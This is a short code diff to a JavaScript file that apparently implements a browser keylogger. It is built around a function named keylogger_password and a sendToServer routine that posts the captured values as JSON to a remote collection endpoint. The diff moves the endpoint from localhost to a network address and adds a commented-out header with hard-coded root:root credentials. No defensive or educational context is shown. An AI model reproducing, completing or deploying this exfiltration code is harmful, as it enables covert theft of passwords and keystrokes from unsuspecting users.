@@ -93,7 +93,7 @@ function keylogger_password(e) {
 }
 
 
-var url = "http://127.0.0.1:8080/json";
+var url = "https://10.43.9.242:8000/json";
 var json = "";
 
 function sendToServer(libelle,value){
@@ -104,6 +104,7 @@ function sendToServer(libelle,value){
 		json = json + '"' + value + '"}';
 		var xhr = new XMLHttpRequest();
 		xhr.open("POST", url, true);
+		//xhr.setRequestHeader("Authorization", "auth " + Base64.encode("root" + ":" + "root"));
 		xhr.setRequestHeader("Content-type", "application/json");
 		xhr.send(json);
 	}
